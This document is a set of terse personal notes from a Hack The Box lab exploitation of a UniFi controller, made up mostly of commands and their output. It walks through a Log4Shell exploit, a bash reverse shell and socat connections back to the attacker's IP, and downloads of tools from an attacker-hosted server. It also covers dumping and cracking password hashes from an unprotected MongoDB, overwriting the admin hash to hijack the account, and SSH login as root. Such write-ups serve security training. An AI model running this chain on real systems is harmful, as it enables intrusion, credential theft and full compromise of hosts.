# https://app.hackthebox.com/starting-point

```bash
# https://tryhackme.com/room/blog

```bash

=================================
10.129.96.149 -- https://10.129.96.149:8443 -- win/lin x32/x64
=================================

echo 'export TARGET=10.129.96.149' >> ~/.zshrc

2025-08-20 13:22:41 -- sudo nmap -Pn -n -sC -sV -O -T4 -oA nmap_scan $TARGET
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)             
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)           
6789/tcp open  ibm-db2-admin?
8080/tcp open  http            Apache Tomcat (language: en)
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Did not follow redirect to https://10.129.96.149:8443/manage
8443/tcp open  ssl/nagios-nsca Nagios NSCA
|_http-title: Site doesnt have a title (text/plain;charset=UTF-8).
| ssl-cert: Subject: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US
| Subject Alternative Name: DNS:UniFi
| Not valid before: 2021-12-30T21:37:24
|_Not valid after:  2024-04-03T21:37:24
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

https://10.129.96.149:8443/manage/account/login?redirect=%2Fmanage
// unifi 6.4.54
curl --insecure --location --output - https://$TARGET:8443
// exploit
https://github.com/puzzlepeaches/Log4jUnifi

https://github.com/puzzlepeaches/Log4jUnifi?tab=readme-ov-file#install

### SPLOITIN TIME ###
nc -lvnp 4444
2025-08-20 14:31:34 -- docker run -it -v $(pwd)/loot:/Log4jUnifi/loot -p 8090:8090 -p 1389:1389 log4junifi -u https://10.129.96.149:8443 -i 10.10.15.115 -p 4444
// need to upgrade shell

nc -vlnp 54321
/bin/bash -i >& /dev/tcp/10.10.15.115/54321 0>&1

// attacker
cd /tmp
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat
ip a ; python3 -m http.server 8000

// target
curl -o socat http://10.10.15.115:8000/socat
chmod +x socat
-rwxr-xr-x 1 unifi unifi 375176 Aug 20 20:07 socat

// attacker
socat file:`tty`,raw,echo=0 tcp-listen:54322

// target
2025-08-20 15:10:21 -- /tmp/socat tcp-connect:10.10.15.115:54322 exec:'bash -li',pty,stderr,setsid,sigint,sane
// finally not shitty shell
// also shell upgrade:
script /dev/null -c bash

// no netstat or ss so... time to parse /proc/
{ printf "%-8s %-22s %-22s %-12s %s\n" "Proto" "Local Address" "Remote Address" "State" "PID/Program Name"; awk 'function hextodec(h,r,i,c,v){h=toupper(h);r=0;for(i=1;i<=length(h);i++){c=substr(h,i,1);if(c~/[0-9]/)v=c;else v=index("ABCDEF",c)+9;r=r*16+v}return r} function hextoip(h,ip,d1,d2,d3,d4){if(length(h)==8){d1=hextodec(substr(h,7,2));d2=hextodec(substr(h,5,2));d3=hextodec(substr(h,3,2));d4=hextodec(substr(h,1,2));return d1"."d2"."d3"."d4}if(length(h)>8){if(hextodec(h)==0)return"::";if(substr(h,1,24)=="0000000000000000FFFF0000"){h=substr(h,25,8);d1=hextodec(substr(h,7,2));d2=hextodec(substr(h,5,2));d3=hextodec(substr(h,3,2));d4=hextodec(substr(h,1,2));return"::ffff:"d1"."d2"."d3"."d4}return h}} NR>1{split($2,l,":");split($3,r,":");lip=hextoip(l[1]);lport=hextodec(l[2]);rip=hextoip(r[1]);rport=hextodec(r[2]);sm["01"]="ESTABLISHED";sm["0A"]="LISTEN";if($4 in sm){if(FILENAME~/tcp6/)p="tcp6";else p="tcp";printf"%-8s %-22s %-22s %-12s %s\n",p,lip":"lport,rip":"rport,sm[$4],$10}}' /proc/net/tcp /proc/net/tcp6 | while read proto laddr raddr state inode; do find_output=$(find /proc -path '*/fd/*' -lname "socket:\[$inode\]" -print -quit 2>/dev/null); if [ -n "$find_output" ]; then pid=$(echo "$find_output" | cut -d'/' -f3); pname=$(cat /proc/$pid/comm 2>/dev/null); printf "%-8s %-22s %-22s %-12s %s/%s\n" "$proto" "$laddr" "$raddr" "$state" "$pid" "$pname"; else printf "%-8s %-22s %-22s %-12s %s\n" "$proto" "$laddr" "$raddr" "$state" "-"; fi; done | sort -k4; }
//
Proto    Local Address          Remote Address         State        PID/Program Name
tcp6     :::22                  :::0                   LISTEN       -
tcp6     :::6789                :::0                   LISTEN       17/java
tcp6     :::8080                :::0                   LISTEN       17/java
tcp6     :::8443                :::0                   LISTEN       17/java
tcp6     :::8843                :::0                   LISTEN       17/java
tcp6     :::8880                :::0                   LISTEN       17/java
tcp      0.0.0.0:22             0.0.0.0:0              LISTEN       -
tcp      127.0.0.53:53          0.0.0.0:0              LISTEN       -
tcp      127.0.0.1:27117        0.0.0.0:0              LISTEN       67/mongod

unifi@unified:/tmp$ which mongosh                  
unifi@unified:/tmp$ which mongo
/usr/bin/mongo
2025-08-20 15:33:53 -- mongo --port 27117
2025-08-20T18:21:07.507+0100 I STORAGE  [initandlisten] 
2025-08-20T18:21:07.507+0100 I STORAGE  [initandlisten] ** WARNING: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine
2025-08-20T18:21:07.507+0100 I STORAGE  [initandlisten] **          See http://dochub.mongodb.org/core/prodnotes-filesystem
2025-08-20T18:21:08.264+0100 I CONTROL  [initandlisten] 
2025-08-20T18:21:08.264+0100 I CONTROL  [initandlisten] ** WARNING: Access control is not enabled for the database.
2025-08-20T18:21:08.264+0100 I CONTROL  [initandlisten] **          Read and write access to data and configuration is unrestricted.
2025-08-20T18:21:08.264+0100 I CONTROL  [initandlisten] 
2025-08-20 15:34:33 -- show dbs
ace       0.002GB
ace_stat  0.000GB
admin     0.000GB
config    0.000GB
local     0.000GB
2025-08-20 15:35:22 -- use ace
2025-08-20 15:35:26 -- show collections
2025-08-20 15:35:59 -- db.admin.find().pretty()
        "name" : "administrator",
        "email" : "administrator@unified.htb",
        "x_shadow" : "$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.",
        "email" : "michael@unified.htb",
        "name" : "michael",
        "x_shadow" : "$6$spHwHYVF$mF/VQrMNGSau0IP7LjqQMfF5VjZBph6VUf4clW3SULqBjDNQwW.BlIqsafYbLWmKRhfWTiZLjhSP.D/M1h5yJ0",
        "email" : "seamus@unified.htb",
        "name" : "Seamus",
        "x_shadow" : "$6$NT.hcX..$aFei35dMy7Ddn.O.UFybjrAaRR5UfzzChhIeCs0lp1mmXhVHol6feKv4hj8LaGe0dTiyvq1tmA.j9.kfDP.xC.",
        "email" : "warren@unified.htb",
        "name" : "warren",
        "x_shadow" : "$6$DDOzp/8g$VXE2i.FgQSRJvTu.8G4jtxhJ8gm22FuCoQbAhhyLFCMcwX95ybr4dCJR/Otas100PZA9fHWgTpWYzth5KcaCZ.",
        "email" : "james@unfiied.htb",
        "name" : "james",
        "x_shadow" : "$6$ON/tM.23$cp3j11TkOCDVdy/DzOtpEbRC5mqbi1PPUM6N4ao3Bog8rO.ZGqn6Xysm3v0bKtyclltYmYvbXLhNybGyjvAey1",
2025-08-20 15:36:53 -- db.user.find().pretty()
// nothing

2025-08-20 15:39:06 -- find / -name "system.properties" 2>/dev/null
cat /path/to/your/system.properties```
// nothing interesting

$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.
$6$spHwHYVF$mF/VQrMNGSau0IP7LjqQMfF5VjZBph6VUf4clW3SULqBjDNQwW.BlIqsafYbLWmKRhfWTiZLjhSP.D/M1h5yJ0
$6$NT.hcX..$aFei35dMy7Ddn.O.UFybjrAaRR5UfzzChhIeCs0lp1mmXhVHol6feKv4hj8LaGe0dTiyvq1tmA.j9.kfDP.xC.
$6$DDOzp/8g$VXE2i.FgQSRJvTu.8G4jtxhJ8gm22FuCoQbAhhyLFCMcwX95ybr4dCJR/Otas100PZA9fHWgTpWYzth5KcaCZ.
$6$ON/tM.23$cp3j11TkOCDVdy/DzOtpEbRC5mqbi1PPUM6N4ao3Bog8rO.ZGqn6Xysm3v0bKtyclltYmYvbXLhNybGyjvAey1
2025-08-20 15:48:13 -- hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt

unifi@unified:/tmp$ cat /home/michael/user.txt  
6ced1a6a89e666c0620cdb10262ba127

2025-08-20 15:54:48 -- hydra -l michael -P /usr/share/wordlists/rockyou.txt -t 4 ssh://$TARGET

2025-08-20 15:56:48 -- wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -O /tmp/linpeas.sh
python3 -m http.server 8000

cd /tmp
curl -o linpeas.sh http://10.10.15.115:8000/linpeas.sh
chmod +x linpeas.sh
2025-08-20 15:58:32 -- ./linpeas.sh -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,network_information,users_information,software_information,interesting_perms_files,interesting_files | tee /tmp/linpeas_output.txt

### TASTY THINGS ###

╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation/sensitive-mounts.html       
═╣ release_agent breakout 1........ Yes                                     

╔══════════╣ Unix Sockets Analysis
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sockets                                                               
/run/unifi/mongodb-27117.sock                                               
  └─(Read Write Execute )

╔══════════╣ Users with console
root:x:0:0:root:/root:/bin/bash                                             
unifi:x:999:999::/home/unifi:/bin/sh

-rw-r--r-- 1 root root 2154 Mar 22  2019 /etc/mongodb.conf
-rw-r--r-- 1 1000 1000 3771 Dec 30  2021 /home/michael/.bashrc
-rw-r--r-- 1 1000 1000 807 Dec 30  2021 /home/michael/.profile
passwd file: /usr/share/lintian/overrides/passwd

╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                         
strace Not Found                                                            
-rwsr-xr-x 1 root root 75K Mar 22  2019 /usr/bin/gpasswd                    
-rwsr-xr-x 1 root root 59K Mar 22  2019 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)  
-rwsr-xr-x 1 root root 44K Mar 22  2019 /usr/bin/chsh
-rwsr-xr-x 1 root root 75K Mar 22  2019 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 40K Mar 22  2019 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 43K Sep 16  2020 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8                                 
-rwsr-xr-x 1 root root 27K Sep 16  2020 /bin/umount  --->  BSD/Linux(08-1996)                                                                           
-rwsr-xr-x 1 root root 44K Mar 22  2019 /bin/su

╔══════════╣ SGID
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                         
-rwxr-sr-x 1 root tty 31K Sep 16  2020 /usr/bin/wall                        
-rwxr-sr-x 1 root shadow 23K Mar 22  2019 /usr/bin/expiry
-rwxr-sr-x 1 root shadow 71K Mar 22  2019 /usr/bin/chage
-rwxr-sr-x 1 root crontab 39K Nov 16  2017 /usr/bin/crontab
-rwxr-sr-x 1 root shadow 34K Apr  8  2021 /sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 34K Apr  8  2021 /sbin/unix_chkpwd


###
    
socat tcp-listen:9001,fork file:unified_linpeas.txt
/tmp/socat tcp-connect:10.10.15.115:9001 file:/tmp/linpeas_output.txt

2025-08-20 17:23:03 -- openssl passwd -6 password123
$6$EZZcaCucfN.gPgmx$Zt12ljQqR.owE8PBeLE.4rR1bNIBETmCARCEQVz.IvjfZ/27IGrrz4ghif3WudJGcYAL00CcsWFeLncc.ft55/
@s1

###

2025-08-25 14:57:57 -- openssl passwd -6 password123
$6$9LzDn.aY5InMTT28$mmLCxUb8x0YIEi932lhnCxVR/6dB4utTkQt/sXhnCzL3OAvUED4aPol0.JC1OP5.ZtgV2EJMAt4js0RU1jdxw0

2025-08-25 14:59:45 -- mongo --port 27117    
use ace;
2025-08-25 15:00:08 -- db.admin.update({ "name" : "administrator" }, { $set: { "x_shadow" : "$6$9LzDn.aY5InMTT28$mmLCxUb8x0YIEi932lhnCxVR/6dB4utTkQt/sXhnCzL3OAvUED4aPol0.JC1OP5.ZtgV2EJMAt4js0RU1jdxw0" } });
// WriteResult({ "nMatched" : 1, "nUpserted" : 0, "nModified" : 1 })
exit;

2025-08-25 15:01:35 -- https://10.129.96.149:8443
// administrator:password123

https://10.129.96.149:8443/manage/site/default/settings/admins/list
administrator	administrator@unified.htb		Super Administrator	Device AdoptDevice Restart	
james	james@unfiied.htb		Read Only	System Stats	
michael	michael@unified.htb		Super Administrator	Device AdoptDevice Restart	
Seamus	seamus@unified.htb		Read Only		
warren	warren@unified.htb		Read Only

2025-08-25 15:04:13 -- https://10.129.96.149:8443/manage/site/default/settings/site
// root:NotACrackablePassword4U2022

2025-08-25 15:05:25 -- sshpass -p 'NotACrackablePassword4U2022' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null root@10.129.96.149
// got root

2025-08-25 15:08:44 -- sudo find / -type f \( -name "user.txt" -o -name "root.txt" \) 2>/dev/null
/root/root.txt
/home/michael/user.txt
// pwned
```
```